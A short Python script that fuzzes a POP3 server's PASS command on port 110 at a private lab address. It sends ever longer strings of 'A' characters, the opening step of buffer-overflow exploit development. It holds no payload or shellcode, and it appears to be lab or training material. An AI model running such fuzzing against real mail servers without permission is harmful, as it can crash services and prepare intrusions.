#!/usr/bin/env python
# by anakein

import socket

buf = 'A'
count = 100

while True:
    print('Fuzzing PASS with %s bytes' % len(buf))          # Print bytes sent
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   # Create socket
    s.connect(('10.0.1.104', 110))                          # connect host, port 110
    data = s.recv(1024)                                     # receive
    #print(data)

    s.send('USER anakein \r\n')                             # send user
    data = s.recv(1024)                                     # receive
    #print(data)

    s.send('PASS ' + buf + '\r\n')                          # send PASS fuzzing
    data = s.recv(1024)                                     # receive
    #print(data)

    buf = 'A'*count
    count = count+100

    s.close                                                 # close connection
